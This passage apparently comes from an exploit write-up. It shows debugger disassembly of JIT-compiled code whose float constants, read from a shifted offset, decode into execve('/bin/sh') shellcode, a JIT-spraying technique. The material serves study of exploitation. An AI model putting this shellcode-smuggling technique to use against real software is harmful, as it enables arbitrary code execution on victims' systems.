   0x6915065ab8d:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab91:	movabs r10,0xbeb596e69622f68
   0x6915065ab9b:	vmovq  xmm0,r10
   0x6915065aba0:	vmovsd QWORD PTR [rax],xmm0
   0x6915065aba4:	movabs r10,0xbeb909020e3c148
   0x6915065abae:	vmovq  xmm0,r10
   0x6915065abb3:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abb7:	movabs r10,0xbeb909053cb0148
   0x6915065abc1:	vmovq  xmm0,r10
   0x6915065abc6:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abca:	movabs r10,0xbeb909090e78948
   0x6915065abd4:	vmovq  xmm0,r10
   0x6915065abd9:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abdd:	movabs r10,0xbebd23148f63148
   0x6915065abe7:	vmovq  xmm0,r10
   0x6915065abec:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abf0:	movabs r10,0xbeb90909090050f
   0x6915065abfa:	vmovq  xmm0,r10
   0x6915065abff:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ac03:	mov    r10,QWORD PTR [rsi+0x77]
   0x6915065ac07:	sub    DWORD PTR [r10],0xc3
   0x6915065ac0e:	js     0x6915065ac2c
   0x6915065ac14:	mov    eax,0x2a
   0x6915065ac19:	mov    rsp,rbp
   0x6915065ac1c:	pop    rbp
   0x6915065ac1d:	ret
   0x6915065ac1e:	call   0x6915065a300
```

Skip the opcode:

```shell
gef➤  x/32i 0x6915065ab40 + 0x2d
   0x6915065ab6d:	push   0x3b
   0x6915065ab6f:	pop    rax
   0x6915065ab70:	nop
   0x6915065ab71:	nop
   0x6915065ab72:	nop
   0x6915065ab73:	jmp    0x6915065ab80
   0x6915065ab75:	vmovq  xmm0,r10
   0x6915065ab7a:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab7e:	movabs r10,0xbeb5b0068732f68
   0x6915065ab88:	vmovq  xmm0,r10
   0x6915065ab8d:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab91:	movabs r10,0xbeb596e69622f68
   0x6915065ab9b:	vmovq  xmm0,r10
   0x6915065aba0:	vmovsd QWORD PTR [rax],xmm0
   0x6915065aba4:	movabs r10,0xbeb909020e3c148
   0x6915065abae:	vmovq  xmm0,r10
   0x6915065abb3:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abb7:	movabs r10,0xbeb909053cb0148
   0x6915065abc1:	vmovq  xmm0,r10
   0x6915065abc6:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abca:	movabs r10,0xbeb909090e78948
   0x6915065abd4:	vmovq  xmm0,r10
   0x6915065abd9:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abdd:	movabs r10,0xbebd23148f63148
   0x6915065abe7:	vmovq  xmm0,r10
   0x6915065abec:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abf0:	movabs r10,0xbeb90909090050f
   0x6915065abfa:	vmovq  xmm0,r10
   0x6915065abff:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ac03:	mov    r10,QWORD PTR [rsi+0x77]
   0x6915065ac07:	sub    DWORD PTR [r10],0xc3
   0x6915065ac0e:	js     0x6915065ac2c
```
